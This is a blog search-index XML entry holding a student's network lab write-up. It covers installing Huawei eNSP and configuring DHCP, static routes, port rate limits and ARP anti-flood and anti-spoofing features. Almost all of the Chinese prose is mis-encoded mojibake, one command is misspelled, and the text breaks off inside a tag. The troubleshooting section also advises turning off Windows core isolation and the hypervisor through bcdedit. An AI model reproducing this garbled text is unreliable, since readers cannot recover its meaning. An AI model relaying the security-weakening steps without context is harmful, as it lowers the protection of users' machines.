<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>è¥¿ç”µBæµ‹-è®¡ç®—æœºç½‘ç»œç»¼åˆå®éªŒ</title>
      <link href="/2024/04/24/2024-4-24-B%E6%B5%8B/"/>
      <url>/2024/04/24/2024-4-24-B%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="è¥¿ç”µBæµ‹-è®¡ç®—æœºç½‘ç»œç»¼åˆå®éªŒ"><a href="#è¥¿ç”µBæµ‹-è®¡ç®—æœºç½‘ç»œç»¼åˆå®éªŒ" class="headerlink" title="è¥¿ç”µBæµ‹-è®¡ç®—æœºç½‘ç»œç»¼åˆå®éªŒ"></a>è¥¿ç”µBæµ‹-è®¡ç®—æœºç½‘ç»œç»¼åˆå®éªŒ</h2><h3 id="enspå®‰è£…è¸©å‘"><a href="#enspå®‰è£…è¸©å‘" class="headerlink" title="enspå®‰è£…è¸©å‘"></a>enspå®‰è£…è¸©å‘</h3><p>æˆ‘è¿™å°ç”µè„‘çš„ç¯å¢ƒæ¯”è¾ƒæ··ä¹±, virtualbox, vmware, dockerä»€ä¹ˆçš„éƒ½æœ‰, è€Œä¸”è¿˜æ˜¯win11, å¯¼è‡´ç–¯ç‹‚è¸©å‘ğŸ¤£, æ•´ä¸ªå®‰è£…å¤§æ¦‚èŠ±è´¹3å°æ—¶ğŸ˜‡</p><h4 id="ç¬¬ä¸€ä¸ªå‘"><a href="#ç¬¬ä¸€ä¸ªå‘" class="headerlink" title="ç¬¬ä¸€ä¸ªå‘"></a>ç¬¬ä¸€ä¸ªå‘</h4><p>virtualboxç‰ˆæœ¬ä¸æ”¯æŒ, æˆ‘ç”µè„‘ä¸Šçš„virtualboxæ˜¯7.0.xç‰ˆæœ¬çš„, ä¸è€ç‰ˆenspä¸å…¼å®¹, éœ€è¦é™çº§åˆ°5.2.xç‰ˆæœ¬, æœ€ç»ˆé€‰äº†5.2.44ç‰ˆæœ¬, 5.2.44ç‰ˆæœ¬çš„virtualboxåˆå’Œwin11ä¸å…¼å®¹, éœ€è¦å°†<strong>å†…æ ¸éš”ç¦»</strong>å…³é—­æ‰èƒ½æ­£å¸¸å®‰è£…, è·¯å¾„: è®¾ç½®â€”&gt;éšç§ä¸å®‰å…¨â€”&gt;windowså®‰å…¨ä¸­å¿ƒâ€”&gt;è®¾å¤‡å®‰å…¨æ€§â€”&gt;å†…æ ¸éš”ç¦»</p><h4 id="ç¬¬äºŒä¸ªå‘"><a href="#ç¬¬äºŒä¸ªå‘" class="headerlink" title="ç¬¬äºŒä¸ªå‘"></a>ç¬¬äºŒä¸ªå‘</h4><p>é‡è£…ä¹‹åå¯åŠ¨è·¯ç”±å™¨æŠ¥é”™,é”™è¯¯ä»£ç 41, å¯ä»¥å‚è€ƒè¿™ç¯‡<a href="https://blog.csdn.net/weixin_51515423/article/details/122304503" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">åšå®¢</a>, æ“ä½œä¹‹åå†æ¬¡å¯åŠ¨è·¯ç”±å™¨æŠ¥é”™, é”™è¯¯ä»£ç 40, æ¥ä¸‹æ¥å°±æ˜¯ç¬¬ä¸‰ä¸ªå‘</p><h4 id="ç¬¬ä¸‰ä¸ªå‘"><a href="#ç¬¬ä¸‰ä¸ªå‘" class="headerlink" title="ç¬¬ä¸‰ä¸ªå‘"></a>ç¬¬ä¸‰ä¸ªå‘</h4><p>è·¯ç”±å™¨å¯åŠ¨æŠ¥é”™40ä¹‹å, æˆ‘ç…§ç€å®˜æ–¹æ–‡æ¡£ä¸€é€šæ“ä½œ, å‘ç°ä¾æ—§æŠ¥é”™40ğŸ˜…, ç„¶åå†³å®šå…¨éƒ¨å¸è½½é‡è£….</p><p>æ­¥éª¤: </p><ol><li>æ§åˆ¶é¢æ¿å¸è½½eNSPã€VirtualBoxã€Wiresharkã€WinCapå››ä¸ªç¨‹åºï¼Œå¦‚æœå­˜åœ¨USBCapã€Npcapï¼Œä¹Ÿå¸è½½</li><li>ä¾æ¬¡æŸ¥çœ‹å¹¶åˆ é™¤:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\huaweiï¼Œè‹¥è¯¥ç›®å½•ä¸‹å­˜åœ¨eNSPæ–‡ä»¶å¤¹ï¼Œè¯·ä¸€å¹¶åˆ é™¤ã€‚</span><br><span class="line">C:\Program Filesï¼Œè‹¥è¯¥ç›®å½•ä¸‹å­˜åœ¨Npcapæ–‡ä»¶å¤¹ï¼Œè¯·ä¸€å¹¶åˆ é™¤ã€‚</span><br><span class="line">C:\Program Files (x86)ï¼Œè‹¥è¯¥ç›®å½•ä¸‹å­˜åœ¨WinCapæ–‡ä»¶å¤¹ï¼Œè¯·ä¸€å¹¶åˆ é™¤ã€‚</span><br><span class="line">C:\ProgramDataï¼Œè‹¥è¯¥ç›®å½•ä¸‹å­˜åœ¨VirtualBoxæ–‡ä»¶å¤¹ï¼Œè¯·ä¸€å¹¶åˆ é™¤ã€‚</span><br><span class="line">C:\Users\ä½ çš„ç”¨æˆ·åï¼Œè‹¥è¯¥ç›®å½•ä¸‹å­˜åœ¨.virtualboxæ–‡ä»¶å¤¹ï¼Œè¯·ä¸€å¹¶åˆ é™¤ã€‚</span><br><span class="line">C:\Users\ä½ çš„ç”¨æˆ·å\AppData\Localï¼Œè‹¥è¯¥ç›®å½•ä¸‹å­˜åœ¨eNSPæ–‡ä»¶å¤¹ï¼Œè¯·ä¸€å¹¶åˆ é™¤ã€‚</span><br></pre></td></tr></table></figure></li><li>æ¸…ç†æ— æ•ˆæ³¨å†Œè¡¨,cmdè¾“å…¥regeditè¿›å…¥, åˆ é™¤ç›¸å…³æ³¨å†Œè¡¨, ä¸»è¦æ˜¯virtualboxç›¸å…³çš„</li></ol><p><strong>ç„¶åé‡è£…,å‘ç°è¿˜æ˜¯æŠ¥é”™40</strong>ğŸ¥°</p><p>ç„¶åæˆ‘ç”¨<strong>virtualboxå»å¯åŠ¨AR_Base</strong>, å¾—åˆ°æŠ¥é”™<code>Raw-mode is unavailable courtesy of Hyper-V. (VERR_SUPDRV_NO_RAW_MODE_HYPER_V_ROOT)</code>, è¿™æ—¶æˆ‘æ„è¯†åˆ°æ˜¯Hyper-Vçš„é—®é¢˜, ä½†æˆ‘çš„Hyper-vå…¶å®æ˜¯æ²¡æœ‰å‹¾é€‰å¯ç”¨çš„, å…¶ä»–<br>ç›¸å…³é€‰é¡¹ä¹Ÿæ²¡æœ‰å‹¾é€‰,å¦‚å›¾: </p><p><img src="https://pb01.s3.bitiful.net/190.webp" alt="avatar"></p><p>æˆ‘æƒ³åˆ°å¯èƒ½æ›¾ç»å®‰è£…Dockerå¼€å¯Hyper-Vå, å³ä½¿ç°åœ¨ä¸å‹¾é€‰äº†, å®ƒä»ç„¶æ²¡æœ‰çœŸæ­£å…³é—­. </p><p>ç®¡ç†å‘˜æƒé™æ‰“å¼€cmd, è¾“å…¥<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bcdedit</span><br></pre></td></tr></table></figure><br>çœ‹åˆ°hypervisorlaunchtypeçš„å€¼æ˜¯Auto,è¾“å…¥<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /set hypervisorlaunchtype off</span><br></pre></td></tr></table></figure><br>å°±å¯ä»¥å…³é—­</p><p><img src="https://pb01.s3.bitiful.net/191.webp" alt="avatar"></p><p>æ‰€ä»¥ä¹‹å‰å¦‚æœæ²¡æœ‰å®‰è£…è¿‡Dockeræˆ–è€…åŠ¨è¿‡Hyper-væ˜¯ä¸ä¼šå‡ºç°è¿™ä¸ªé—®é¢˜çš„,è§£é‡Šå¦‚ä¸‹:</p><p><strong>hypervisorlaunchtype</strong>æ˜¯Windowsæ“ä½œç³»ç»Ÿçš„å¼•å¯¼é€‰é¡¹ï¼Œç”¨äºæ§åˆ¶å¤„ç†å™¨å’Œè™šæ‹ŸåŒ–æŠ€æœ¯ä¹‹é—´çš„äº¤äº’æ–¹å¼ã€‚è¿™ä¸ªé€‰é¡¹çš„å€¼å¯ä»¥æ˜¯â€Autoâ€ã€â€Offâ€æˆ–â€Hypervisorâ€ã€‚å®ƒçš„é»˜è®¤å€¼ä¸ºâ€Autoâ€ï¼Œè¡¨ç¤ºå¤„ç†å™¨å°†æ ¹æ®éœ€è¦è‡ªåŠ¨å¯ç”¨æˆ–ç¦ç”¨è™šæ‹ŸåŒ–æŠ€æœ¯ã€‚1å¦‚æœWindowsä¸­å®‰è£…äº†Dockerï¼Œæƒ³è¦æ­£å¸¸ä½¿ç”¨çš„è¯å°±å¿…é¡»å¼€å¯Hyper-Vï¼Œå¦åˆ™ä¼šå‡ºç°é”™è¯¯æç¤ºã€‚ä½†æ˜¯å¦‚æœWindowsç³»ç»Ÿä¸­åŒæ—¶å­˜åœ¨VMwareè™šæ‹Ÿæœºçš„è¯ï¼Œå¼€å¯Hyper-Våˆä¼šå¯¼è‡´è™šæ‹Ÿæœºç”¨ä¸äº†ï¼Œè¿™ä¸ªæ—¶å€™å°±åªèƒ½å…³é—­Hyper-Vã€‚</p><h3 id="å®éªŒ"><a href="#å®éªŒ" class="headerlink" title="å®éªŒ"></a>å®éªŒ</h3><h4 id="å®éªŒå†…å®¹å’Œè¦æ±‚"><a href="#å®éªŒå†…å®¹å’Œè¦æ±‚" class="headerlink" title="å®éªŒå†…å®¹å’Œè¦æ±‚"></a>å®éªŒå†…å®¹å’Œè¦æ±‚</h4><p><strong>å†…å®¹</strong>:</p><ol><li>åˆ©ç”¨åä¸ºeNSPç½‘ç»œæ¨¡æ‹Ÿå™¨ï¼Œæ­å»ºä¸ä¸‹å›¾ç›¸å¯¹åº”çš„ç½‘ç»œæ‹“æ‰‘ã€‚åœ¨å®éªŒæ‹“æ‰‘ä¸­å…±æœ‰3ä¸ªç½‘æ®µï¼ˆç½‘1ã€ç½‘2å’Œç½‘3ï¼‰ï¼Œå…¶ç½‘ç»œå‚æ•°å‚è§è¡¨æ ¼ã€‚æ¯ä¸ªç½‘æ®µä½¿ç”¨1å°äº¤æ¢æœºã€‚</li><li>è·¯ç”±å™¨R1è¿æ¥ç½‘1ä¸ç½‘2ï¼Œè·¯ç”±å™¨R2è¿æ¥ç½‘2ä¸ç½‘3ã€‚</li><li>æŒ‰ç…§è¦æ±‚å¯¹æ¯å°è®¾å¤‡è¿›è¡Œé…ç½®ï¼Œæœ€ç»ˆä¿è¯æ‰€æœ‰è®¾å¤‡çš„è¿é€šæ€§ã€‚</li></ol><p><img src="https://s3.bitiful.net/pb01/192.webp" alt="avatar"></p><div class="table-container"><table><thead><tr><th>ç½‘ç»œ</th><th>å­ç½‘æ©ç </th><th>ç½‘ç»œå·</th></tr></thead><tbody><tr><td>ç½‘1</td><td>255.255.255.0</td><td>192.168.1.0</td></tr><tr><td>ç½‘2</td><td>255.255.255.0</td><td>192.168.5.0</td></tr><tr><td>ç½‘3</td><td>255.255.255.0</td><td>192.168.3.0</td></tr></tbody></table></div><p><strong>è¦æ±‚</strong>:</p><ol><li>ä¸»æœºAä¸ä¸»æœºBçš„IPv4åœ°å€ã€å­ç½‘æ©ç ä»¥åŠé»˜è®¤ç½‘å…³ç­‰å‚æ•°ç”±ç½‘ç»œè®¾å¤‡ä¸­çš„DHCPæœåŠ¡è‡ªåŠ¨åˆ†é…ï¼›</li><li>ä¸»æœºCå’Œä¸»æœºDçš„IPv4åœ°å€ã€å­ç½‘æ©ç ä»¥åŠé»˜è®¤ç½‘å…³ç­‰å‚æ•°ç”±æ‰‹åŠ¨åˆ†é…ï¼Œä¸”åœ°å€çš„æœ€åä¸€ä¸ªå­—èŠ‚å¿…é¡»è®¾ç½®ä¸ºä»»ä¸€ç»„å‘˜å­¦å·çš„åä¸‰ä½ï¼Œå¦åˆ™æµ‹è¯•ä¸é€šè¿‡ã€‚</li><li>å¯¹ä¸»æœºAæ‰€è¿æ¥çš„ç½‘ç»œè®¾å¤‡ç«¯å£è¿›è¡Œé™é€Ÿï¼Œå…¶ä¸­å…¥æ–¹å‘å’Œå‡ºæ–¹å‘å‡é™åˆ¶ä¸ºç«¯å£æœ€å¤§é€Ÿç‡çš„50%ã€‚</li><li>é€‰æ‹©åˆé€‚çš„ç½‘ç»œè®¾å¤‡ï¼Œé…ç½®è‡³å°‘ä¸¤ç§é˜²ARPæ³›æ´ªæ”»å‡»åŠŸèƒ½ä»¥åŠè‡³å°‘ä¸¤ç§é˜²ARPæ¬ºéª—æ”»å‡»åŠŸèƒ½ã€‚</li></ol><h4 id="ä¿å§†çº§æ•™ç¨‹"><a href="#ä¿å§†çº§æ•™ç¨‹" class="headerlink" title="ä¿å§†çº§æ•™ç¨‹"></a>ä¿å§†çº§æ•™ç¨‹</h4><p>é€‰ç”¨è®¾å¤‡: PC,äº¤æ¢æœºS5700,è·¯ç”±å™¨AR1220</p><p>æ€»çš„è¿æ¥å›¾:</p><p><img src="https://s3.bitiful.net/pb01/186.webp" alt="avatar"></p><p><strong>è‡ªåŠ¨è·å–IP</strong>:<br>PC1å’ŒPC2å³é”®æ‰“å¼€è®¾ç½®,ipv4å‹¾é€‰DHCP</p><p><img src="https://s3.bitiful.net/pb01/187.webp" alt="avatar"></p><p><strong>é…ç½®AR2</strong>:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sys <span class="comment"># è¿›å…¥ç³»ç»Ÿè§†å›¾</span></span><br><span class="line">int g0/0/0 <span class="comment"># é…ç½®GE 0/0/0ç«¯å£</span></span><br><span class="line">ip address 192.168.1.195 24 <span class="comment"># è®¾ç½®ç«¯å£å¤„IP mask</span></span><br><span class="line">dhcp <span class="built_in">enable</span> <span class="comment"># å¯åŠ¨DHCPæœåŠ¡</span></span><br><span class="line">ip pool ggls_p1 <span class="comment"># åˆ›å»ºIPæ± </span></span><br><span class="line">network 192.168.1.0 mask 24 <span class="comment"># å»ºç«‹ç½‘æ®µ ç½‘ç»œå· mask</span></span><br><span class="line">gateway-list 192.168.1.195 <span class="comment"># ç½‘å…³ IP</span></span><br><span class="line">int g0/0/0 </span><br><span class="line">dhcp <span class="keyword">select</span> global <span class="comment"># å¯åŠ¨åˆ†é…</span></span><br><span class="line">int g0/0/1</span><br><span class="line">ip address 192.168.5.2 24 <span class="comment"># å°†è·¯ç”±å™¨GE 0/0/1æ‹‰å…¥ 192.168.5.0 ç½‘æ®µï¼Œåé¢è¦ç”¨</span></span><br><span class="line">quit</span><br><span class="line"><span class="comment"># é…ç½®é™æ€è·¯ç”±ï¼Œåé¢è¦ç”¨</span></span><br><span class="line"><span class="comment"># æƒ³å»192.168.5.0/24çš„ä¸‹ä¸€è·³æ˜¯192.168.5.195</span></span><br><span class="line">ip route-static 192.168.5.0 24 192.168.5.195</span><br><span class="line"><span class="comment"># æƒ³å»192.168.3.0/24çš„ä¸‹ä¸€è·³æ˜¯192.168.5.195</span></span><br><span class="line">ip route-static 192.168.3.0 24 192.168.5.195</span><br><span class="line">quit</span><br><span class="line">save</span><br></pre></td></tr></table></figure><br><code>ä¸€å®šè¦è®°å¾—ä¿å­˜,ä¸ç„¶é‡åšè™½ç„¶ä¸éš¾,ä½†å¾ˆéº»çƒ¦,åé¢çš„ä¹Ÿæ˜¯</code></p><p><strong>é…ç½®LSW2</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">sys</span><br><span class="line">vlan 1 <span class="comment"># åˆ›å»ºvlan 1</span></span><br><span class="line">int vlanif 1</span><br><span class="line">ip address 192.168.5.195 24 <span class="comment"># é…ç½®ç½‘å…³</span></span><br><span class="line">int g0/0/1 <span class="comment"># è®© GE 0/0/1åŠ å…¥vlan1</span></span><br><span class="line">port link-type access</span><br><span class="line">port default vlan 1</span><br><span class="line">int g0/0/2 <span class="comment"># è®© GE 0/0/2åŠ å…¥vlan1</span></span><br><span class="line">port link-type access</span><br><span class="line">port default vlan 1</span><br><span class="line">int g0/0/3 <span class="comment"># è®© GE 0/0/3åŠ å…¥vlan1</span></span><br><span class="line">port link-type access</span><br><span class="line">port default vlan 1</span><br><span class="line">quit</span><br><span class="line"><span class="comment"># å’ŒAR3ã€AR4çš„é™æ€è·¯ç”±é…ç½®å¯¹åº”ï¼Œæ³¨æ„äº†è¿™æ³¢</span></span><br><span class="line"><span class="comment"># æƒ³å»192.168.1.0/24çš„ä¸‹ä¸€è·³æ˜¯192.168.5.2</span></span><br><span class="line">ip route-static 192.168.1.0 24 192.168.5.2</span><br><span class="line"><span class="comment"># æƒ³å»192.168.3.0/24çš„ä¸‹ä¸€è·³æ˜¯192.168.5.3</span></span><br><span class="line">ip route-static 192.168.3.0 24 192.168.5.3 </span><br><span class="line">quit</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><strong>AR3é…ç½®</strong>:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sys</span><br><span class="line">int g0/0/0</span><br><span class="line">ip address 192.168.5.3 24</span><br><span class="line">int g0/0/1</span><br><span class="line">ip address 192.168.3.195 24</span><br><span class="line">quit</span><br><span class="line">ip route-static 192.168.1.0 24 192.168.5.195</span><br><span class="line">ip route-static 192.168.5.0 24 192.168.5.195</span><br></pre></td></tr></table></figure></p><p><strong>PC3å’ŒPC4é…ç½®</strong>:</p><p>ç½‘å…³ä¸ä¹‹å‰è®¾ç½®çš„ä¸€è‡´å³å¯,åˆ†åˆ«ä¸º192.168.5.195å’Œ192.168.3.195,ipè‡ªå·±è®¾ç½®</p><p><img src="https://s3.bitiful.net/pb01/188.webp" alt="avatar"></p><p>ä¹‹åå…¨éƒ¨å¯åŠ¨,çœ‹å››å°PCä¹‹é—´æ˜¯å¦èƒ½äº’ç›¸pingé€š,å¦‚æœä¸èƒ½,å°±å»ä¸€ä¸ªä¸€ä¸ªçš„pingæ¥å£,æ‰¾åˆ°æ–­çš„åœ°æ–¹,æ’æŸ¥é—®é¢˜</p><p>PC1å’ŒPC2çš„ipä½¿ç”¨ipconfigå‘½ä»¤æŸ¥çœ‹,è‡³æ­¤è¦æ±‚1,2å°±ç»“æŸäº†</p><p><strong>é™åˆ¶é€Ÿç‡</strong>:<br>å› ä¸ºæ˜¯åƒå…†çš„ç½‘å£,é™åˆ¶åˆ°50%,å°±è®¾ç½®äº†500M</p><p>è¦é…ç½®LSW4,ä»£ç å¦‚ä¸‹:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sys</span><br><span class="line">int g0/0/1</span><br><span class="line">qos lr inbound cir 500000 <span class="comment">#500*1000=&gt; 500Mbps</span></span><br><span class="line">qos lr outbound cir 500000</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ç»“æœ:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sys</span><br><span class="line">int g0/0/1</span><br><span class="line">dispaly this</span><br></pre></td></tr></table></figure><p>![avatar]<a href="https://s3.bitiful.net/pb01/195.webp">https://s3.bitiful.net/pb01/195.webp</a></p><p><strong>åº”å¯¹ARPæ³›æ´ª</strong>:<br>å¦‚æœè®¾å¤‡å¯¹æ”¶åˆ°çš„å¤§é‡ARPæŠ¥æ–‡å…¨éƒ¨è¿›è¡Œå¤„ç†ï¼Œå¯èƒ½å¯¼è‡´CPUè´Ÿè·è¿‡é‡è€Œæ— æ³•å¤„ç†å…¶ä»–ä¸šåŠ¡ã€‚å› æ­¤ï¼Œåœ¨å¤„ç†ä¹‹å‰ï¼Œè®¾å¤‡éœ€è¦å¯¹ARPæŠ¥æ–‡è¿›è¡Œé™é€Ÿï¼Œä»¥ä¿æŠ¤CPUèµ„æºã€‚</p><p>å¦‚æœç½‘ç»œä¸­æœ‰ç”¨æˆ·å‘è®¾å¤‡å‘é€å¤§é‡ç›®æ ‡IPåœ°å€ä¸èƒ½è§£æçš„IPæŠ¥æ–‡ï¼ˆå³è·¯ç”±è¡¨ä¸­å­˜åœ¨è¯¥IPæŠ¥æ–‡çš„ç›®çš„IPå¯¹åº”çš„è·¯ç”±è¡¨é¡¹ï¼Œä½†è®¾å¤‡ä¸Šæ²¡æœ‰è¯¥è·¯ç”±è¡¨é¡¹ä¸­ä¸‹ä¸€è·³å¯¹åº”çš„ARPè¡¨é¡¹ï¼‰ï¼Œå°†å¯¼è‡´è®¾å¤‡è§¦å‘å¤§é‡çš„ARP Missæ¶ˆæ¯ã€‚è¿™ç§è§¦å‘ARP Missæ¶ˆæ¯çš„IPæŠ¥æ–‡ä¼šè¢«ä¸Šé€åˆ°è®¾å¤‡è¿›è¡Œå¤„ç†ï¼Œè®¾å¤‡ä¼šæ ¹æ®ARP Missæ¶ˆæ¯ç”Ÿæˆå’Œä¸‹å‘å¤§é‡ä¸´æ—¶ARPè¡¨é¡¹å¹¶å‘ç›®çš„ç½‘ç»œå‘é€å¤§é‡ARPè¯·æ±‚æŠ¥æ–‡ï¼Œè¿™æ ·å°±å¢åŠ äº†è®¾å¤‡CPUçš„è´Ÿæ‹…ï¼ŒåŒæ—¶ä¸¥é‡æ¶ˆè€—ç›®çš„ç½‘ç»œçš„å¸¦å®½èµ„æºã€‚</p><p><strong>åœ¨AR2å’ŒAR3ä¸­éƒ½è¦é…ç½®</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sys </span><br><span class="line"><span class="comment"># ARPæŠ¥æ–‡é™é€Ÿ</span></span><br><span class="line">int g0/0/0</span><br><span class="line">arp anti-attack rate-limit <span class="built_in">enable</span> </span><br><span class="line">arp anti-attack rate-limit 80 1</span><br><span class="line">int g0/0/1</span><br><span class="line">arp anti-attack rate-limit <span class="built_in">enable</span> </span><br><span class="line">arp anti-attack rate-limit 80 1</span><br><span class="line"><span class="comment"># ARP Missæ¶ˆæ¯é™é€Ÿ</span></span><br><span class="line">arp-miss anti-attack rate-limit <span class="built_in">enable</span></span><br></pre></td></tr></table></figure><p><strong>åº”å¯¹ARPæ¬ºéª—</strong>:</p><p><code>ARPæŠ¥æ–‡åˆæ³•æ€§æ£€æŸ¥</code>: è¿™äº›æ£€æŸ¥æ˜¯ç”¨æ¥<strong>åˆ¤æ–­ARPæŠ¥æ–‡çš„æ ¼å¼è·ŸARPåè®®çš„è§„å®šæ˜¯å¦ä¸€è‡´</strong>ã€‚å…¶ä¸­ä»¥å¤ªç½‘æ•°æ®å¸§é¦–éƒ¨ä¸­çš„æºMACåœ°å€å’ŒARPæŠ¥æ–‡æ•°æ®åŒºä¸­çš„æºMACåœ°å€ä¸ä¸€è‡´çš„ARPæŠ¥æ–‡æ˜¯åè®®å…è®¸çš„æŠ¥æ–‡ï¼Œä½†æ˜¯åœ¨å®é™…çš„åº”ç”¨ä¸­ï¼Œè¯¥ç±»æŠ¥æ–‡å¾ˆå¯èƒ½æ˜¯æ”»å‡»æŠ¥æ–‡ã€‚ARPæŠ¥æ–‡åˆæ³•æ€§æ£€æŸ¥åŠŸèƒ½åï¼Œè®¾å¤‡<strong>ä¼šå¯¹æ”¶åˆ°çš„ARPæŠ¥æ–‡è¿›è¡Œä»¥å¤ªç½‘æ•°æ®å¸§é¦–éƒ¨ä¸­çš„æºMACåœ°å€å’ŒARPæŠ¥æ–‡æ•°æ®åŒºä¸­çš„æºMACåœ°å€çš„ä¸€è‡´æ€§æ£€æŸ¥</strong>ï¼Œå¦‚æœä¸¤è€…ä¸ä¸€è‡´ï¼Œåˆ™ç›´æ¥ä¸¢å¼ƒè¯¥ARPæŠ¥æ–‡ï¼Œå¦åˆ™å…è®¸è¯¥ARPæŠ¥æ–‡é€šè¿‡</p><p><code>ARPè¡¨é¡¹å›ºåŒ–</code>: </p><ul><li><p><strong>fixed-allæ–¹å¼</strong>, åªæœ‰å½“ARPæŠ¥æ–‡å¯¹åº”çš„MACåœ°å€ã€æ¥å£ã€VLANä¿¡æ¯å’ŒARPè¡¨é¡¹ä¸­çš„ä¿¡æ¯å®Œå…¨åŒ¹é…æ—¶ï¼Œè®¾å¤‡æ‰å¯ä»¥æ›´æ–°ARPè¡¨é¡¹çš„å…¶ä»–å†…å®¹ã€‚æ­¤æ–¹å¼é€‚ç”¨äºç”¨æˆ·MACåœ°å€å›ºå®šï¼Œå¹¶ä¸”ç”¨æˆ·æ¥å…¥ä½ç½®ç›¸å¯¹å›ºå®šçš„åœºæ™¯ã€‚</p></li><li><p><strong>fixed-macæ–¹å¼</strong>, è®¾å¤‡æ”¶åˆ°çš„ARPæŠ¥æ–‡ä¸­çš„MACåœ°å€ä¸ARPè¡¨ä¸­å¯¹åº”æ¡ç›®çš„MACåœ°å€ä¸åŒ¹é…ï¼Œåˆ™ç›´æ¥ä¸¢å¼ƒè¯¥ARPæŠ¥æ–‡ï¼›å¦‚æœåŒ¹é…ï¼Œä½†æ˜¯æ”¶åˆ°æŠ¥æ–‡çš„æ¥å£æˆ–VLANä¿¡æ¯ä¸ARPè¡¨ä¸­å¯¹åº”æ¡ç›®ä¸åŒ¹é…ï¼Œåˆ™å¯ä»¥æ›´æ–°å¯¹åº”ARPæ¡ç›®ä¸­çš„æ¥å£å’ŒVLANä¿¡æ¯ã€‚æ­¤æ–¹å¼é€‚ç”¨äºç”¨æˆ·MACåœ°å€å›ºå®šï¼Œä½†ç”¨æˆ·æ¥å…¥ä½ç½®é¢‘ç¹å˜åŠ¨çš„åœºæ™¯ã€‚å½“ç”¨æˆ·ä»ä¸åŒæ¥å£æ¥å…¥è®¾å¤‡æ—¶ï¼Œè®¾å¤‡ä¸Šè¯¥ç”¨æˆ·å¯¹åº”çš„ARPè¡¨é¡¹ä¸­çš„æ¥å£ä¿¡æ¯å¯ä»¥åŠæ—¶æ›´æ–°ã€‚</p></li><li><p><strong>send-ackæ–¹å¼</strong>, è®¾å¤‡æ”¶åˆ°ä¸€ä¸ªæ¶‰åŠMACåœ°å€ã€VLANã€æ¥å£ä¿®æ”¹çš„ARPæŠ¥æ–‡æ—¶ï¼Œä¸ä¼šç«‹å³æ›´æ–°ARPè¡¨é¡¹ï¼Œè€Œæ˜¯å…ˆå‘å¾…æ›´æ–°çš„ARPè¡¨é¡¹ç°æœ‰MACåœ°å€å¯¹åº”çš„ç”¨æˆ·å‘é€ä¸€ä¸ªå•æ’­çš„ARPè¯·æ±‚æŠ¥æ–‡è¿›è¡Œç¡®è®¤ï¼Œæ ¹æ®ç¡®è®¤ç»“æœå†å†³å®šæ˜¯å¦æ›´æ–°ARPè¡¨é¡¹ä¸­çš„MACåœ°å€ã€VLANå’Œæ¥å£ä¿¡æ¯ã€‚æ­¤æ–¹å¼é€‚ç”¨äºç”¨æˆ·çš„MACåœ°å€å’Œæ¥å…¥ä½ç½®å‡é¢‘ç¹å˜åŠ¨çš„åœºæ™¯ã€‚</p></li></ul><p><strong>åœ¨AR2å’ŒAR3ä¸­éƒ½è¦é…ç½®</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sys</span><br><span class="line"><span class="comment"># ARPæŠ¥æ–‡åˆæ³•æ€§æ£€æŸ¥</span></span><br><span class="line">arp anti-attack packet-check sender-mac</span><br><span class="line"><span class="comment"># ARPè¡¨é¡¹å›ºåŒ–</span></span><br><span class="line">arp anti-attack entry-check fixed-all</span><br></pre></td></tr></table></figure><p>æœ€åæŸ¥çœ‹ä¸€ä¸‹ARPå®‰å…¨é…ç½®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">display arp anti-attack configuration all</span><br></pre></td></tr></table></figure><p>å¦‚å›¾:<br><img src="https://s3.bitiful.net/pb01/189.webp" alt="avatar"></p><h3 id="éªŒæ”¶é—®é¢˜"><a href="#éªŒæ”¶é—®é¢˜" class="headerlink" title="éªŒæ”¶é—®é¢˜"></a>éªŒæ”¶é—®é¢˜</h3><p>æ¨èçœ‹<a 